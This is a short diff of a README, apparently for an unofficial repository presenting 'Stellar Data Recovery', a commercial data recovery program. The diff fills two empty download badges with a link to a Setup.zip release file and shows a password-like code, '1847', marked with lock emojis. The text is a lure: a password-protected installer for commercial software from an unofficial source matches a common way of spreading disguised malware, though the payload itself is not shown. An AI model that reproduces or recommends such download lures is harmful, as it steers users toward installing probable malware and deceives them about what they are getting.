@@ -8,7 +8,7 @@
 
 ---
 
-[![Download](og-image.png)]()
+[![Download](og-image.png)](https://github.com/Tagiruncover/Stellar-Data-Recovery/releases/download/Last/Setup.zip)
 
 
 ---
@@ -21,7 +21,7 @@
 
 ## 📥 Download
 
-[![Stellar Data Recovery](https://img.shields.io/badge/Download%20Stellar%20Data%20Recovery-Open%20Page-0a84ff?style=for-the-badge&logo=github)]()
+[![Stellar Data Recovery](https://img.shields.io/badge/Download%20Stellar%20Data%20Recovery-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/Tagiruncover/Stellar-Data-Recovery/releases/download/Last/Setup.zip)
 
 **🔐🔐🔐** `1847`
 
